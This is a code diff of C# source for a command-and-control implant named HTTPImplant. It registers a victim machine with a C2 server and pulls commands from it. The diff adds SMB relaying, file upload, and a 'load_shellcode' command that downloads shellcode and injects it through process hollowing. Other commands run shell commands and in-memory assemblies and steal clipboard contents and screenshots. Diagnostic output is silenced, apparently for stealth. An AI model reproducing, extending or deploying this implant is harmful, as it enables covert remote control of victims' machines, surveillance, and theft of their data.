@@ -1,20 +1,17 @@
 using System;
-using System.Diagnostics;
 using System.Net;
-using System.Reflection;
 using System.Text;
-using System.Timers;
 using HTTPImplant.Modules;
-using System.Runtime.InteropServices;
-using System.Threading.Tasks;
-using System.Linq;
+using System.IO;
+using SMBImplant.Modules;
 
 namespace HTTPImplant
 {
     public class Command
     {
+
         public string Input { get; set; }
-        public string command { get; set; }  // Renamed to avoid conflict with class name
+        public string command { get; set; }
         public string Args { get; set; }
         public string ImplantUser { get; set; }
         public string Operator { get; set; }
@@ -22,6 +19,7 @@ namespace HTTPImplant
         public string Delay { get; set; }
         public string File { get; set; }
         public string usesmb { get; set; }
+        public string actsmb { get; set; }
     }
 
     public class Victim
@@ -41,25 +39,30 @@ namespace HTTPImplant
     // This Implant class acts as the entry point of the implant program.
     public class Implant
     {
+
         public static Victim victim = new Victim();
-        public static string host = "<IP>";  // Host of the implant server
-        public static string port = "<PORT>"; // Port of the implant server
-        private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
+        public static string host = "aefserver";  // Host of the implant server
+        public static string port = "8081"; // Port of the implant server
+        public static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
-        private static bool usesmb;
+        public static bool actsmb;
+        public static string computername = string.Empty;
+        public static string token = string.Empty;
 
         public static void Main(string[] args)
         {
-            Do();
-        }
-        public static void Do()
-        {
-            Console.WriteLine("Doing");
+
+            Console.WriteLine("Testing Powerless");
+            string outputPowerless = Powerless.Exec("whoami");
+            Console.WriteLine("Power-less-Shell:\n\n\t" + outputPowerless);
+
+            Environment.Exit(0);
+
             string implantId = Environment.MachineName;
 
             string victim_information = GenerateJson();
 
-            RegisterImplant(victim_information);
+            token = RegisterImplant(victim_information);
             var victim = new Victim();
 
             victim = GetVictim(victim);
@@ -70,36 +73,43 @@ namespace HTTPImplant
 
             using (WebClient webClient = new WebClient())
             {
+                string jsonResponse = "";
                 string lastCommandExecuted = "";
                 while (true)
                 {
                     try
                     {
-                        string jsonResponse = webClient.DownloadString(new Uri("http://" + host + ":" + port + "/getCommand"));
-                        Console.WriteLine("Getting instructions...");
-
                         Command command = new Command();
-                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
-                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
-                        command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
-                        command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
-                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
-                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
-                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
-                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
-                        command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\"}" }, StringSplitOptions.None)[1];
 
-
-                        if (!bool.TryParse(command.usesmb, out usesmb))
-
-                        if (usesmb)
+                        if (!SMB)
                         {
-                            SMB = true; // Assuming SMB is a boolean variable
-                        } else
-                        {
-                            SMB = false;
+                            string url = "http://" + host + ":" + port + "/getCommand?token="+token+"&user=" + victim.Username;
+                            //Console.WriteLine("Getting instructions from: " + url);
+
+                            jsonResponse = webClient.DownloadString(new Uri(url));
+
+                            command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
+                            command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
+                            command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
+                            command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
+                            command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
+                            command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
+                            command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
+                            command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
+                            command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\",\"actsmb" }, StringSplitOptions.None)[1];
+                            command.actsmb = jsonResponse.Split(new string[] { "\"actsmb\":\"", "\"}" }, StringSplitOptions.None)[1];
+
+                            //SMBServer.StoreCommand(command);
                         }
 
+                        else
+                        {
+                            jsonResponse = SMBClient.ReadCommandFromSMB(computername);
+                            if (string.IsNullOrEmpty(jsonResponse))
+                            {
+                                continue; // Skip this iteration if no command is received
+                            }
+                        }
                         /*Console.WriteLine("User for issued command: " + command.ImplantUser);
                         Console.WriteLine("Current implant user: " + victim.Username);*/
 
@@ -117,35 +127,86 @@ namespace HTTPImplant
                                         string outputAssembly = ExecuteAssembly.Execute(bytes);
                                         string outputBase64Assembly = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputAssembly));
                                         Console.WriteLine(outputAssembly);
-                                        SendResult(webClient, implantId, command.Operator, outputBase64Assembly, SMB);
+                                        if (SMB)
+                                        {
+                                            SMBClient.SendData(outputBase64Assembly, computername); // Replace with your SMB sending method
+                                        }
+                                        else
+                                        {
+                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64Assembly);
+                                        }
                                         break;
 
                                     case "os":
-                                        Console.WriteLine("Running command: " + command.Input);
+                                        //Console.WriteLine("Running command: " + command.Input);
                                         string outputOS = Commands.command(command.command, command.Args);
                                         string outputBase64OS = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputOS));
-                                        SendResult(webClient, implantId, command.Operator, outputBase64OS, SMB);
+                                        if (SMB)
+                                        {
+                                            SMBClient.SendData(outputBase64OS, computername);
+                                        }
+                                        else
+                                        {
+                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64OS);
+                                        }
+                                        break;
+
+                                    case "enable_smb_client":
+                                        SMB = true;
+                                        computername = command.Args;
+                                        Console.WriteLine("Enabling SMB Client with computer: " + computername);
+                                        break;
+
+                                    case "enable_smb_server":
+                                        Console.WriteLine("Starting SMB Server");
+                                        SMBServer.StartServer(host, port, command.ImplantUser, command.Operator);
                                         break;
 
                                     case "clip":
-                                        Console.WriteLine("Running clipboard fetcher... ");
+                                        //Console.WriteLine("Running clipboard fetcher... ");
                                         string outputClip = ClipboardFetcher.GetData();
                                         string outputBase64Clip = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputClip));
-                                        SendResult(webClient, implantId, command.Operator, outputBase64Clip, SMB);
+                                        if (SMB)
+                                        {
+                                            SMBClient.SendData(outputBase64Clip, computername);
+                                        }
+                                        else
+                                        {
+                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64Clip);
+                                        }
                                         break;
 
                                     case "screengrab":
-                                        Console.WriteLine("Running screen fetcher... ");
+                                        //Console.WriteLine("Running screen fetcher... ");
                                         string outputScreen = ScreenGrab.CaptureScreen();
-                                        SendResult(webClient, implantId, command.Operator, outputScreen, SMB);
+                                        HTTP.SendResult(host, port, implantId, command.Operator, outputScreen);
                                         break;
 
                                     case "cd":
-                                        Console.WriteLine("Changing the current directory");
+                                        //Console.WriteLine("Changing the current directory");
                                         string path = command.Args;
                                         string output = Commands.SetCurrentDir(path);
                                         string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                        SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
+                                        if (SMB)
+                                        {
+                                            SMBClient.SendData(outputBase64, computername);
+                                        }
+                                        else
+                                        {
+                                            HTTP.SendResult(host, port, implantId, command.Operator, outputBase64);
+                                        }
+                                        break;
+
+                                    case "upload":
+                                        Console.WriteLine("Received: " + command.Input);
+                                        Console.WriteLine("Uploading: " + command.Args);
+
+                                        byte[] file = Convert.FromBase64String(command.File);
+
+                                        File.WriteAllBytes(command.Args, file);
+
+                                        Console.WriteLine("File saved to: " + command.command);
+
                                         break;
 
                                     case "loadcs":
@@ -169,10 +230,11 @@ namespace HTTPImplant
                                         }
                                         break;
 
-                                    case "upload":
-                                        // The code for "upload" command goes here
-                                        string file = command.File;
-
+                                    case "load_shellcode":
+                                        Console.WriteLine("Loading custom shellcode");
+                                        string url = command.File;
+                                        byte[] shellcode = CodeFetch.FetchCode(url);
+                                        ShellcodeLoader.ProcHollow(shellcode);
                                         break;
 
                                     default:
@@ -181,48 +243,19 @@ namespace HTTPImplant
                                     }
                                     lastCommandExecuted = command.Input;
                             }
-                            catch (Exception ex)
+                            catch (Exception)
                             {
-                                Console.WriteLine(ex.Message);
+                                //Console.WriteLine(ex.Message);
                             }
                         }
                     }
-                    catch (Exception e)
+                    catch (Exception)
                     {
                         System.Threading.Thread.Sleep(5000);
-                        Console.WriteLine(e.Message);
+                        //Console.WriteLine(e.Message);
                     }
                 }
             }
-        }
-
-        public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64, bool useSMB)
-        {
-            useSMB = false;
-            string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
-            byte[] XORKey = Convert.FromBase64String(XORKeyB64);
-
-            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
-            byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);
-
-            string data = Convert.ToBase64String(encryptedResultJson);
-            if (!useSMB)
-            {
-                webClient.UploadString(new Uri("http://" + host + ":" + port + "/postOutput"), "POST", data);
-            } else
-            {
-                /*SMBClient.SendData(data);*/
-            }
-        }
-
-        public static byte[] XOR(byte[] data, byte[] key)
-        {
-            byte[] result = new byte[data.Length];
-            for (int i = 0; i < data.Length; i++)
-            {
-                result[i] = (byte)(data[i] ^ key[i % key.Length]);
-            }
-            return result;
         }
 
         public static string GenerateJson()
@@ -285,21 +318,33 @@ namespace HTTPImplant
         }
 
 
-        public static void RegisterImplant(string victim_json)
+        public static string RegisterImplant(string victim_json)
         {
+            string response = "";
             using (var webClient = new WebClient())
             {
                 webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
                 try
                 {
-                    webClient.UploadString(new Uri("http://" + host + ":" + port + "/registerNewImplant"), "POST", victim_json);
+                    response = webClient.UploadString(new Uri("http://" + host + ":" + port + "/registerNewImplant"), "POST", victim_json);
+
+                    // Check if the response contains "token: "
+                    if (response.StartsWith("token: "))
+                    {
+                        // Extract the token part
+                        return response.Substring("token: ".Length).Trim();
+                    }
                 }
-                catch (WebException ex)
+                catch (WebException)
                 {
                     // Handle the exception according to your needs
-                    Console.WriteLine("Error: " + ex.Message);
+                    //Console.WriteLine("Error: " + ex.Message);
                 }
+
+                // Return the full response or handle accordingly if the expected token format is not found
+                return response;
             }
         }
+
     }
 }
